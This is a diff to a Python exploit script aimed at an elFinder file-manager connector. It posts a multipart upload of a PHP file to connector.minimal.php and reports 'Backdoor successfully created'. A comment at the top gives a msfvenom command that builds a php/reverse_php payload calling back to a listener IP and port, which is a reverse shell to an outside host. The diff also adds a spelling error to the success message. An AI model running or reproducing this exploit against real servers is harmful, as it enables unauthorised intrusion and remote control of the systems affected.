@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 # For some reason the exploit doesn't work with base64 encoded php payloads ie. don't use '-e php/base64'in msfvenom
 # Eg. msfvenom --platform php -a php -p php/reverse_php LHOST=192.168.92.134 LPORT=4445 -o payload.php
 
@@ -41,7 +42,7 @@ def main(URL,php_path):
 	multipart_form_data = {
 		'cmd': (None, 'upload'),
 		'target': (None, 'l1_Lw'),
-		'upload[]': (filename,open('payload.php','r'), 'application/octet-stream')
+		'upload[]': (filename,open(php_path,'r'), 'application/octet-stream')
 	}
 
 	hdrs = {
@@ -54,7 +55,7 @@ def main(URL,php_path):
 	resp = requests.post(URL + "/vendor_extra/elfinder/php/connector.minimal.php",files=multipart_form_data,headers=hdrs)
 
 	if resp.status_code == 200:
-		print("Backdoor successfully created")
+		print("Backdoor succssfully created")
 	else:
 		print("Error on uploading file, exiting...")
 		return 1
